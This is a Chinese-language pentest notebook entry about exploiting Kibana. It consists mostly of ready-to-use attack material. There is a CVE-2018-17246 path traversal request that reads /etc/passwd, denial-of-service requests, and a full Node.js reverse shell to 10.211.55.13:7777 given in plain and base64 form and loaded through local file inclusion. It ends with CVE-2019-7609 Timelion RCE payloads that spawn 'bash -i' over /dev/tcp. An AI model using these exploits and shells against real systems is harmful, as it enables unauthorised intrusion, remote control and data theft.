---
title: Kibana
encrypt: false
enc_pwd: askding
categories:
  - Kali
  - Exploit
date: 2020-12-10 11:32:07
top:
tags:
layout:
---
编写进度
- [x] 



Kibana 是为 Elasticsearch设计的开源分析和可视化平台。用户可以使用 Kibana 来搜索、查看存储在 Elasticsearch 索引中的数据并与之交互，并且可以很容易实现高级的数据分析和可视化，以图标的形式展现出来。用户可以在大量数据之上创建条形图，折线图和散点图，或饼图和地图。

Kibana还提供了一个称为Canvas的演示工具，用户可以利用该工具来创建幻灯片平台，并且直接从Elasticsearch中获取实时数据。并且Elasticsearch，Logstash和Kibana的组合可以作为数据服务产品。Logstash向Elasticsearch提供输入流以进行存储和搜索，而Kibana则访问数据以进行可视化。


## 信息收集

```zsh
nmap -Pn -T4 -sSUV -p 5601 192.168.79.207                                                                    
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-10 14:55 CST
Nmap scan report for 192.168.79.207
Host is up (0.00017s latency).

PORT     STATE  SERVICE  VERSION
5601/tcp open   http     Elasticsearch Kibana 5.6.12
5601/udp closed esmagent

Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds
```


##  漏洞利用

```zsh
GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd   # 任意文件读取
GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=es_6.0

GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis= ../../../cli_plugin/index #拒绝服务漏洞

```
#### 拒绝服务漏洞
```zsh
 curl 'http://192.168.79.207:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis= ../../../cli_plugin/index.js'   
 curl 'http://192.168.79.207:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis= ../../../cli_plugin/cli.js'
 curl 'http://192.168.79.207:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis= ../../../docs/cli.js'
```

#### 任意文件读取 CVE-2018-17246
```zsh
curl 'http://192.168.79.207:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd'

{"statusCode":500,"error":"Internal Server Error","message":"An internal server error occurred"}%                       
```
虽然响应码为500，但是服务器日志可以泄漏

![kibana-1](../images/kibana-1.png)

通常情况下Kibana与其他的应用程序一起部署，如果应用程序可以上传或者写入Javascript文件的话，攻击者可以通过Nodejs创建一个Reverse Shell:
文件shell.js内容如下： 放到服务器中
```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(7777, "10.211.55.13", function(){    //vps_ip:192.168.33.1  port:8080
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();

base64格式：
ZnVuY3Rpb24oKXsKICAgIHZhciBuZXQgPSByZXF1aXJlKCJuZXQiKSwKICAgICAgICBjcCA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKSwKICAgICAgICBzaCA9IGNwLnNwYXduKCIvYmluL3NoIiwgW10pOwogICAgdmFyIGNsaWVudCA9IG5ldyBuZXQuU29ja2V0KCk7CiAgICBjbGllbnQuY29ubmVjdCg3Nzc3LCAiMTAuMjExLjU1LjEzIiwgZnVuY3Rpb24oKXsgICAgLy92cHNfaXA6MTkyLjE2OC4zMy4xICBwb3J0OjgwODAKICAgICAgICBjbGllbnQucGlwZShzaC5zdGRpbik7CiAgICAgICAgc2guc3Rkb3V0LnBpcGUoY2xpZW50KTsKICAgICAgICBzaC5zdGRlcnIucGlwZShjbGllbnQpOwogICAgfSk7CiAgICByZXR1cm4gL2EvOyAvLyBQcmV2ZW50cyB0aGUgTm9kZS5qcyBhcHBsaWNhdGlvbiBmb3JtIGNyYXNoaW5nCn0pKCk7

```

```zsh
echo "<shell.js base64 encoded string >" | base64 -d >>/tmp/shell.js

nc -lvp 7777 # 本地监听7777端口

curl 'http://192.168.79.207:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../tmp/shell.js'

```

#### Kinana远程代码执行 
存在漏洞版本：
**Kibana 5.6.15之前版本和6.6.1之前版本中的Timelion visualizer存在安全漏洞**

该漏洞触发，需要Timelion 和 Canvas插件

```zsh
http://192.168.79.207:5601/app/kibana#/management?_g=()   #查看Kibana版本
```
点在**Timelion**处,直接填入**payload**，点击**run**
```zsh
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/IP/PORT 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')

.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("/bin/touch /tmp/success");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```
成功后，再访问**“Canvas”**页面触发命令`/bin/touch /tmp/success`，

![kibana-2](../images/kibana-2.png)




[Kibana_RCE_CVE-2019-7609](https://github.com/LandGrey/CVE-2019-7609/)

